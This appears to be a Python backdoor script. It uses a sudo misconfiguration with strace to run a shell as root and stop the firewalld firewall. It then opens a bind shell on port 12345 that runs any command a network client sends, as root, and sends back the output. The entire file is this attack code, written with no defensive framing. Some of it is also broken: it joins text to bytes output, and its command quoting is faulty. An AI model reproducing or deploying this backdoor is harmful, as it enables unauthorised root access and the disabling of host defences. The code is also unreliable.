import socket
import os
import subprocess

#disable firewall (cant connect w/o)
#utilizes strace vuln to use systemctl as root
os.system('sudo strace -o /dev/null /bin/sh -c "systemctl stop firewalld"')
# next create a socket object 
s = socket.socket()         
print ("Socket successfully created")

# reserve a port on your computer in our 
# case it is 12345 but it can be anything 
port = 12345                

# Next bind to the port 
# we have not typed any ip in the ip field 
# instead we have inputted an empty string 
# this makes the server listen to requests 
# coming from other computers on the network 
s.bind(('', port))         
print ("socket binded to %s" %(port)) 

# put the socket into listening mode 
s.listen(5)     
print ("socket is listening")            

# a forever loop until we interrupt it or 
# an error occurs 
while True: 

# Establish connection with client. 
  c, addr = s.accept()     
  print ('Got connection from', addr )

  # send a thank you message to the client. encoding to send byte type. 
  c.send('Thank you for connecting'.encode()) 
  while True:
      cmd = c.recv(1024).decode("utf-8").strip().split()
      inputcmd = ["sudo","strace","-o","/dev/null","/bin/sh","-c"]
      #cmd[0] = "\"" + cmd[0]
      #cmd[len(cmd) - 1] = cmd[len(cmd) - 1] + "\""
      i = 0 
      for item in cmd:
          print(item)
          string = item
          if i == 0:
              string = "\"" + item
          elif i == len(cmd) - 1:
              string = item + "\""
          inputcmd.append(string)
          print(string)

      output = subprocess.check_output(inputcmd)
      message = "Output is: " + output
      c.send(message.encode())
      
  # Close the connection with the client 
  c.close()
  
  # Breaking once connection closed
  break
